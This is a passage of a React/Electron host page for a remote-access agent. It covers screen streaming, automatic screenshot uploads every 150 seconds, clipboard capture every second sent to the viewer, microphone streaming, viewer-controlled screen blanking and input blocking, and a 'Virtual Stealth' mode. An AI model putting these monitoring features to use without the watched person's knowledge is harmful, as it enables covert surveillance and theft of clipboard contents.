    if (!agent.stream) {
      console.error('[host] ❌ Screen capture failed — cannot proceed');
      _setError('Screen capture failed — retrying in 5s');
      _setStatus('error');
      agent.initialized = false;
      agent.reconnect = setTimeout(() => agentInit(), 5000);
      return;
    }
    
    console.log('[host] ✅ Screen capture ready, connecting WebSocket...');
  }

  // 4. Connect WS — device goes ONLINE immediately on ws.onopen
  agentConnectWebSocket();

  // 5. Browser mode: set idle status (user must manually activate)
  if (!IS_ELECTRON) {
    _setStatus('idle');
  }
}

// Screenshot capture and upload (Electron only)
async function captureAndUploadScreenshot() {
  if (!IS_ELECTRON || !agent.stream || !agent.deviceId) {
    return;
  }

  try {
    console.log('[host] 📸 Capturing screenshot...');
    
    // Create canvas and video element
    const canvas = document.createElement('canvas');
    const video = document.createElement('video');
    video.srcObject = agent.stream;
    video.muted = true;
    
    // Wait for video to be ready
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });
    
    // Set canvas dimensions to 1280x720
    canvas.width = 1280;
    canvas.height = 720;
    const ctx = canvas.getContext('2d');
    
    // Draw video frame to canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // Convert to JPEG with 0.5 quality
    let quality = 0.5;
    let base64 = canvas.toDataURL('image/jpeg', quality);
    
    // Reduce quality iteratively if size exceeds 200KB
    while (base64.length > 200 * 1024 && quality > 0.1) {
      quality -= 0.1;
      base64 = canvas.toDataURL('image/jpeg', quality);
      console.log(`[host] 📸 Reducing quality to ${quality.toFixed(1)} (size: ${(base64.length / 1024).toFixed(1)}KB)`);
    }
    
    // Only upload if size is <= 200KB
    if (base64.length <= 200 * 1024) {
      await axios.post(`${API_URL}/device-screenshot`, {
        device_id: agent.deviceId,
        image: base64,
      });
      console.log(`[host] ✅ Screenshot uploaded (${(base64.length / 1024).toFixed(1)}KB, quality: ${quality.toFixed(1)})`);
    } else {
      console.warn(`[host] ⚠️  Screenshot too large (${(base64.length / 1024).toFixed(1)}KB) — skipping upload`);
    }
    
    // Cleanup
    video.pause();
    video.srcObject = null;
  } catch (err) {
    console.error('[host] ❌ Screenshot capture failed:', err);
  }
}

// Start screenshot capture interval (Electron only)
function startScreenshotCapture() {
  if (!IS_ELECTRON || !agent.stream) {
    return;
  }
  
  // Clear existing interval
  if (agent.screenshotInterval) {
    clearInterval(agent.screenshotInterval);
  }
  
  console.log('[host] 📸 Starting automatic screenshot capture (every 150 seconds)');
  
  // Capture immediately
  captureAndUploadScreenshot();
  
  // Then capture every 150 seconds (2.5 minutes)
  agent.screenshotInterval = setInterval(() => {
    captureAndUploadScreenshot();
  }, 150000); // 150 seconds = 2.5 minutes
}

// Start clipboard monitoring (Electron only)
function startClipboardMonitoring() {
  if (!IS_ELECTRON || !agent.dc || agent.dc.readyState !== 'open') {
    return;
  }
  
  // Clear existing interval
  if (agent.clipboardInterval) {
    clearInterval(agent.clipboardInterval);
  }
  
  console.log('[host] 📋 Starting clipboard monitoring (every 1 second)');
  agent.lastClipboard = '';
  
  agent.clipboardInterval = setInterval(async () => {
    if (!agent.dc || agent.dc.readyState !== 'open') {
      console.log('[host] 📋 DataChannel not open — stopping clipboard monitoring');
      if (agent.clipboardInterval) {
        clearInterval(agent.clipboardInterval);
        agent.clipboardInterval = null;
      }
      return;
    }
    
    try {
      const text = await window.electronAPI.getClipboardText();
      
      // Check size limit (1MB)
      if (text && text.length > 1024 * 1024) {
        console.warn('[host] 📋 Clipboard content too large (>1MB) — skipping sync');
        return;
      }
      
      // Only send if content changed
      if (text && text !== agent.lastClipboard) {
        agent.lastClipboard = text;
        agent.dc.send(JSON.stringify({
          type: 'clipboard',
          text: text,
        }));
        console.log(`[host] 📋 Clipboard synced to viewer (${text.length} chars)`);
      }
    } catch (err) {
      console.error('[host] ❌ Clipboard read failed:', err);
    }
  }, 1000);
}

function agentTeardown() {
  agent.closed = true;
  agent.initialized = false;
  clearInterval(agent.heartbeat);
  clearTimeout(agent.reconnect);
  clearInterval(agent.screenshotInterval);
  clearInterval(agent.clipboardInterval);
  agent.screenshotInterval = null;
  agent.clipboardInterval = null;
  agent.lastClipboard = '';
  agent.ws?.close();
  agent.ws = null;
  agentCleanupPeer();
  agent.blackStream?.getTracks().forEach(t => t.stop());
  agent.blackStream = null;
  agent.stream?.getTracks().forEach(t => t.stop());
  agent.stream = null;
  agentStopMic();

  if (IS_ELECTRON && window.electronAPI) {
    window.electronAPI.blackScreenOff();
  }
}

// ---------------------------------------------------------------------------
// React component — thin UI shell over the module-level agent.
// ---------------------------------------------------------------------------
export default function HostPage() {
  const navigate = useNavigate();

  const [status, setStatus]                       = useState('initializing');
  const [deviceName, setDeviceName]               = useState('');
  const [deviceId, setDeviceId]                   = useState('');
  const [viewerConnected, setViewerConnected]     = useState(false);
  const [blackScreenActive, setBlackScreenActive] = useState(false);
  const [blockInputActive, setBlockInputActive]   = useState(false);
  const [error, setError]                         = useState('');
  const [stealthModeActive, setStealthModeActive] = useState(false);
  const [showSetupWizard, setShowSetupWizard]     = useState(false);
  const [micActive, setMicActive]                 = useState(false);
  const [micBars, setMicBars]                     = useState([0, 0, 0, 0, 0]);

  const micAnalyserRef  = useRef(null);
  const micAnimFrameRef = useRef(null);

  // Wire agent → React state setters on every mount (safe, idempotent)
  _setStatus      = setStatus;
  _setError       = setError;
  _setViewerConn  = setViewerConnected;
  _setBlackScreen = setBlackScreenActive;
  _setBlockInput  = setBlockInputActive;
  _setStealthMode = setStealthModeActive;
  _setShowSetupWizard = setShowSetupWizard;

  // Start/stop mic visualizer when micActive changes
  useEffect(() => {
    if (!micActive || !agent.micStream) {
      // Stop animation
      if (micAnimFrameRef.current) {
        cancelAnimationFrame(micAnimFrameRef.current);
        micAnimFrameRef.current = null;
      }
      if (micAnalyserRef.current) {
        micAnalyserRef.current = null;
      }
      setMicBars([0, 0, 0, 0, 0]);
      return;
    }

    // Set up Web Audio analyser
    try {
      const ctx = new AudioContext();
      const source = ctx.createMediaStreamSource(agent.micStream);
      const analyser = ctx.createAnalyser();
      analyser.fftSize = 64;
      analyser.smoothingTimeConstant = 0.7;
      source.connect(analyser);
      micAnalyserRef.current = analyser;

      const dataArray = new Uint8Array(analyser.frequencyBinCount);
      const NUM_BARS = 5;

      const animate = () => {
        analyser.getByteFrequencyData(dataArray);
        // Sample 5 evenly-spaced frequency bins
        const bars = Array.from({ length: NUM_BARS }, (_, i) => {
          const idx = Math.floor((i / NUM_BARS) * dataArray.length);
          return Math.round((dataArray[idx] / 255) * 100);
        });
        setMicBars(bars);
        micAnimFrameRef.current = requestAnimationFrame(animate);
      };
      animate();

      return () => {
        cancelAnimationFrame(micAnimFrameRef.current);
        ctx.close();
      };
    } catch (e) {
      console.warn('[host] Mic visualizer error:', e.message);
    }
  }, [micActive]);

  // Expose mic active setter so agentSetAudioMode can drive it
  _setMicActive = setMicActive;

  useEffect(() => {
    // Sync UI state from agent (handles StrictMode remount after agent already ran)
    setDeviceId(agent.deviceId || getDeviceId());
    setDeviceName(getDeviceName());

    // Start agent — no-op if already initialized
    agentInit().then(() => {
      // Sync device identity into UI after init resolves
      setDeviceId(agent.deviceId);
      setDeviceName(getDeviceName());
    });

    // Cleanup: only tear down on real navigation away, not StrictMode remount.
    // We detect a real unmount by checking if the component remounts within
    // the same tick — but the simplest reliable approach is: don't tear down
    // on unmount at all during dev StrictMode. Instead, teardown is triggered
    // by explicit user action (deactivate) or page unload.
    const onUnload = () => agentTeardown();
    window.addEventListener('beforeunload', onUnload);
    return () => {
      window.removeEventListener('beforeunload', onUnload);
      // Only tear down if navigating away (agent.initialized stays true across
      // StrictMode remounts, so agentInit() will skip on the second mount).
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Browser manual controls
  const handleActivate = useCallback(async () => {
    await agentStartStream();
    if (!agent.ws || agent.ws.readyState !== WebSocket.OPEN) {
      agentConnectWebSocket();
    }
  }, []);

  const handleDeactivate = useCallback(() => {
    agentTeardown();
    setStatus('idle');
    setError('');
  }, []);

  // ── Render ──────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-zinc-50" data-testid="host-page">

      {/* Setup Wizard */}
      {showSetupWizard && (
        <VirtualDisplaySetup
          onComplete={() => {
            setShowSetupWizard(false);
            agentEnableStealthMode();
          }}
          onCancel={() => setShowSetupWizard(false)}
        />
      )}

      {blackScreenActive && (
        <div className="black-screen-overlay" data-testid="black-screen-overlay">
          <div className="text-center">
            <div className="text-zinc-800 text-xs font-mono tracking-widest uppercase mb-2">
              Screen hidden by viewer
            </div>
            <div className="w-2 h-2 bg-zinc-800 rounded-full mx-auto animate-pulse" />
          </div>
        </div>
      )}
      {blockInputActive && !blackScreenActive && (
        <div className="block-input-overlay" data-testid="block-input-overlay" />
      )}

      {/* INITIALIZING */}
      {status === 'initializing' && (
        <div className="min-h-screen flex items-center justify-center">
          <p className="text-sm text-zinc-400 font-mono animate-pulse">Initializing agent...</p>
        </div>
      )}

      {/* IDLE — browser only */}
      {status === 'idle' && !IS_ELECTRON && (
        <div className="min-h-screen flex items-center justify-center p-6">
          <div className="w-full max-w-md text-center">
            <Monitor className="w-14 h-14 text-zinc-300 mx-auto mb-6" strokeWidth={1} />
            <h1 className="font-heading text-3xl font-black tracking-tighter text-zinc-950 mb-2">
              Agent Ready
            </h1>
            <p className="text-sm text-zinc-500 mb-1">{deviceName}</p>
            <p className="font-mono text-xs text-zinc-400 mb-8">{deviceId}</p>
            {error && <div className="text-sm text-rose-600 mb-4" data-testid="activate-error">{error}</div>}
            <button
              onClick={handleActivate}
              className="bg-[#002FA7] hover:bg-[#001D66] text-white px-8 py-4 font-medium text-lg transition-colors inline-flex items-center gap-3"
              data-testid="activate-btn"
            >
              <Power className="w-5 h-5" strokeWidth={1.5} />
              Activate Agent
            </button>
            <button
              onClick={() => navigate('/')}
              className="block mx-auto mt-6 text-sm text-zinc-400 hover:text-zinc-600 transition-colors"
              data-testid="back-to-landing"
            >
              Back to home
            </button>
          </div>
        </div>
      )}

      {/* ACTIVE */}
      {status === 'active' && (
        <div className="min-h-screen flex flex-col">
          <div className="bg-white border-b border-zinc-200 px-6 py-3 flex items-center justify-between shrink-0">
            <div className="flex items-center gap-3">
              <div className="w-2.5 h-2.5 bg-green-500 rounded-full agent-pulse" />
              <span className="font-heading font-bold text-zinc-950">{deviceName}</span>
              <span className="font-mono text-xs text-zinc-400">{deviceId}</span>
            </div>
            <div className="flex items-center gap-3">
              {IS_ELECTRON && (
                <button
                  onClick={() => stealthModeActive ? agentDisableStealthMode() : agentEnableStealthMode()}
                  className={`text-xs transition-colors flex items-center gap-1.5 px-3 py-1.5 rounded ${
                    stealthModeActive
                      ? 'bg-blue-600 text-white hover:bg-blue-700'
                      : 'text-zinc-500 hover:text-blue-600 border border-zinc-200 hover:border-blue-300'
                  }`}
                  data-testid="stealth-mode-btn"
                  title={stealthModeActive ? 'Disable virtual display stealth mode' : 'Enable virtual display stealth mode'}
                >
                  <Shield className="w-3.5 h-3.5" strokeWidth={1.5} />
                  {stealthModeActive ? 'Virtual Stealth ON' : 'Virtual Stealth'}
                </button>
              )}
              {!IS_ELECTRON && (
                <button
                  onClick={handleDeactivate}
                  className="text-xs text-zinc-400 hover:text-rose-600 transition-colors flex items-center gap-1.5"
                  data-testid="deactivate-btn"
                >
                  <Power className="w-3.5 h-3.5" strokeWidth={1.5} />
                  Deactivate
                </button>
              )}
            </div>
          </div>
          <div className="flex-1 flex items-center justify-center p-6">
            <div className="text-center">
              {viewerConnected ? (
                <>
                  <Wifi className="w-16 h-16 text-green-500 mx-auto mb-6" strokeWidth={1} />
                  <h2 className="font-heading text-2xl sm:text-3xl font-bold text-zinc-950 mb-2">
                    Viewer Connected
                  </h2>
                  <p className="text-sm text-zinc-500">Your screen is being shared</p>

                  {/* Mic visualizer */}
                  {micActive && (
                    <div className="mt-6 flex flex-col items-center gap-2">
                      <div className="flex items-center gap-1.5">
                        <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse" />
                        <span className="text-xs text-zinc-500 font-mono">MIC ACTIVE</span>
                      </div>
                      <div className="flex items-end gap-1 h-10">
                        {micBars.map((vol, i) => (
                          <div
                            key={i}
                            className="w-2 rounded-sm bg-green-500 transition-all duration-75"
                            style={{
                              height: `${Math.max(4, vol * 0.4)}px`,
                              opacity: vol > 5 ? 1 : 0.3,
                            }}
                          />
                        ))}
                      </div>
                    </div>
                  )}
                </>
              ) : (
                <>
                  <div className="w-16 h-16 rounded-full border-2 border-dashed border-zinc-300 flex items-center justify-center mx-auto mb-6">
                    <Monitor className="w-8 h-8 text-zinc-300" strokeWidth={1} />
                  </div>
                  <h2 className="font-heading text-2xl sm:text-3xl font-bold text-zinc-950 mb-2">
                    Agent Active
                  </h2>
                  <p className="text-sm text-zinc-500">Waiting for a viewer to connect...</p>
                </>
              )}
            </div>
          </div>
        </div>
      )}

      {/* ERROR */}
      {status === 'error' && (
        <div className="min-h-screen flex items-center justify-center p-6">
          <div className="text-center">
            <Shield className="w-10 h-10 text-rose-400 mx-auto mb-4" strokeWidth={1.5} />
            <p className="text-sm text-rose-600 mb-2" data-testid="error-msg">{error}</p>
            <p className="text-xs text-zinc-400">Retrying automatically...</p>
          </div>
        </div>
      )}
    </div>
  );
}
